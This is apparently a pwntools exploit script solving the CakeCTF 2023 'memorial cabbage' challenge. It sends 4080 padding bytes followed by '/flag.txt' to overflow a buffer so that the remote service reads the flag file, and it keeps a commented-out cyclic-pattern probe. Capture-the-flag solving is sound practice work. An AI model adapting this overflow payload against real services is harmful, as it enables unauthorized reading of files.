#!/usr/bin/env python3
from pwn import *

context.encoding = "latin"
context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./cabbage")
libc = elf.libc
# libc = ELF("./libc.so.6")

gdbscript = """
c
"""

p = remote("memorialcabbage.2023.cakectf.com", 9001)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)

p.sendlineafter(b'>', b'1')
# p.sendlineafter(b': ', b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaaaaamnaaaaaamoaaaaaampaaaaaamqaaaaaamraaaaaamsaaaaaamtaaaaaamuaaaaaamvaaaaaamwaaaaaamxaaaaaamyaaaaaamzaaaaaanbaaaaaancaaaaaandaaaaaaneaaaaaanfaaaaaangaaaaaanhaaaaaaniaaaaaanjaaaaaankaaaaaanlaaaaaanmaaaaaannaaaaaanoaaaaaanpaaaaaanqaaaaaanraaaaaansaaaaaantaaaaaanuaaaaaanvaaaaaanwaaaaaanxaaaaaanyaaaaaanzaaaaaaobaaaaaaocaaaaaaodaaaaaaoeaaaaaaofaaaaaaogaaaaaaohaaaaaaoiaaaaaaojaaaaaaokaaaaaaolaaaaaaomaaaaaaonaaaaaaooaaaaaaopaaaaaaoqaaaaaaoraaaaaaosaaaaaaotaaaaaaouaaaaaaovaaaaaaowaaaaaaoxaaaaaaoyaaaaaaozaaaaaapbaaaaaapcaaaaaapdaaaaaapeaaaaaapfaaaaaapgaaaaaaphaaaaaapiaaaaaapjaaaaaapkaaaaaaplaaaaaapmaaaaaapnaaaaaapoaaaaaappaaaaaapqaaaaaapraaaaaapsaaaaaaptaaaaaapuaaaaaapvaaaaaapwaaaaaapxaaaaaapyaaaaaapzaaaaaaqbaaaaaaqcaaaaaaqdaaaaaaqeaaaaaaqfaaaaaaqgaaaaaaqhaaaaaaqiaaaaaaqjaaaaaaqkaaaaaaqlaaaaaaqmaaaaaaqnaaaaaaqoaaaaaaqpaaaaaaqqaaaaaaqraaaaaaqsaaaaaaqtaaaaaaquaaaaaaqvaaaaaaqwaaaaaaqxaaaaaaqyaaaaaaqzaaaaaarbaaaaaarcaaaaaardaaaaaareaaaaaarfaaaaaargaaaaaarhaaaaaariaaaaaarjaaaaaarkaaaaaarlaaaaaarmaaaaaarnaaaaaaroaaaaaarpaaaaaarqaaaaaarraaaaaarsaaaaaartaaaaaaruaaaaaarvaaaaaarwaaaaaarxaaaaaaryaaaaaarzaaaaaasbaaaaaascaaaaaasdaaaaaaseaaaaaasfaaaaaasgaaaaaashaaaaaasiaaaaaasjaaaaaaskaaaaaaslaaaaaasmaaaaaasnaaaaaasoaaaaaaspaaaaaasqaaaaaasraaaaaassaaaaaastaaaaaasuaaaaaasvaaaaaaswaaaaaasxaaaaaasyaaaaaaszaaaaaatbaaaaaatcaaaaaatdaaaaaateaaaaaatfaaaaaatgaaaaaathaaaaaatiaaaaaatjaaaaaatkaaaaaatlaaaaaatmaaaaaatnaaaaaatoaaaaaatpaaaaaatqaaaaaatraaaaaatsaaaaaattaaaaaatuaaaaaatvaaaaaatwaaaaaatxaaaaaatyaaaaaatzaaaaaaubaaaaaaucaaaaaaudaaaaaaueaaaaaaufaaaaaaugaaaaaauhaaaaaauiaaaaaaujaaaaaaukaaaaaaulaaaaa')
p.sendlineafter(b': ', (b'a' * 4080) + b'/flag.txt\x00')
p.sendlineafter(b'>', b'2')

p.interactive()